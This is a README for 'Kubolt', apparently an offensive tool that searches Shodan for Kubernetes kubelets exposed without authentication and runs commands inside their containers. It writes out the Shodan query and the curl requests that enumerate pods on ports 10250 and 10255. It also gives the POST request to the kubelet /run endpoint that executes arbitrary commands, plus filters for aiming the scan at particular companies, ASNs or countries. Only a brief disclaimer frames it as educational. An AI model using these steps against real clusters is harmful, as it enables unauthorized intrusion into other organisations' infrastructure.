# Wat?
**Kubolt** is simple utility to scan public unauthinticated kubernetes clusters and run commands inside containers

# Why?
If the cluster exposed port 10250 to internet it's possible to use getrun function from [kubelet](https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/server.go) and run commands inside containers:
```go
// getRun handles requests to run a command inside a container.
func (s *Server) getRun(request *restful.Request, response *restful.Response) {
	params := getExecRequestParams(request)
	pod, ok := s.host.GetPodByName(params.podNamespace, params.podName)
	if !ok {
		response.WriteError(http.StatusNotFound, fmt.Errorf("pod does not exist"))
		return
	}
```

# How?
Okay, let's ask our friend Shodan :trollface:
The basic query is 
>ssl:true port:10250 404 

**Kubelet** use port 10250 with SSL by default, 404 is the HTTP response without URL path. 

**Kubolt** ask Shodan by API for list of IP addresses and keep them for other OSINT actions :grin:

First, let's ask Kubelet for running pods and filter hosts where response doesn't contain `Unauthorized` and contain `container` so we could run command inside it. 
```bash
curl -k https://IP-from-Shodan:10250/runningpods/ 
```
Anyway, if you find the host without any running pods at the time, keep it for next time when pods might be started :grin: 

You could list all the available pods from these requests:
```bash
curl -k https://IP-from-Shodan:10250/pods/
#or
curl http://IP-from-Shodan:10255/pods/ 
```

Next **kubolt** parse response and generate a new request as below:
```bash
curl -XPOST -k https://IP-from-Shodan:10250/run/<namespace>/<PodName>/<containerName> -d "cmd=<command-to-run>" 
```
You could target companies more accurate using Shodan filters like this:
- asn
- org
- country
- net


To do it use `--query` param like this:
```python3
python kubolt.py --query "asn:123123 org:'ACME Corporation'"
#or
python kubolt.py --query "org:'ACME Corporation' country:UK"
```

# Shodan 
**Kubolt** use Shodan API and [Query Credits](https://help.shodan.io/the-basics/credit-types-explained) accordingly, if you run the tool without query filters then you will probably fire all your credits `¯\_(ツ)_/¯`  

# Demo
![demo](/github-scale.gif)

# Important
The Tool provided by the author should only be used for educational purposes. The author can not be held responsible for the misuse of the Tool. The author is not responsible for any direct or indirect damage caused due to the usage of the Tool.
